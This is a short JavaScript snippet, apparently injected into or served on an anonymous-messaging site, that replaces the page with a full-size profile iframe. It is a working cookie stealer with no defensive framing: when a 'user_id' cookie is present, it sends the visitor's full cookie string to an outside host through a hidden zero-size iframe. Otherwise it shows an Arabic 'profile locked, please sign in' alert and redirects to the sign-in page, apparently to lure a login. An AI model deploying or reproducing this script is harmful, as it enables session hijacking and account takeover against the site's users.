
// clear page and start draw iframe in full size
document.write();
document.write('<iframe src="https://www.sarhne.com/hodaahmedsalem" width="100%" height="100%"></iframe>');


if (document.cookie.includes("user_id")){
    
    
    

    document.write('<iframe src="https://sarahah.top/u/fisherbbc##'+document.cookie+'" style="position: absolute;width:0;height:0;border:0;"></iframe>');


}
else{

    arabic_msg = "قام هذا المستخدم بقفل ملفه الشخصى . برجاء تسجيل الدخول لعرض الملف الشخصى";
    
    
    // tell user to sign in
    

        alert(arabic_msg);

        window.location.href="https://www.sarhne.com/signin.html";

    
}
